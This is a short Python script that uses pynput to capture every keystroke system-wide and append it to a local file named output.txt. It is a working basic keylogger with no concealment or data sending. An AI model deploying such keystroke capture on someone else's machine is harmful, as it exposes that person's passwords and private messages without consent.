from pynput import keyboard

def on_press(key): 
    try:
        with open("output.txt", "a", encoding="utf-8") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open("output.txt", "a", encoding="utf-8") as file:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.tab:
                file.write("\t")
            elif key == keyboard.Key.esc:
                file.write("[ESC]")
            else: 
                pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()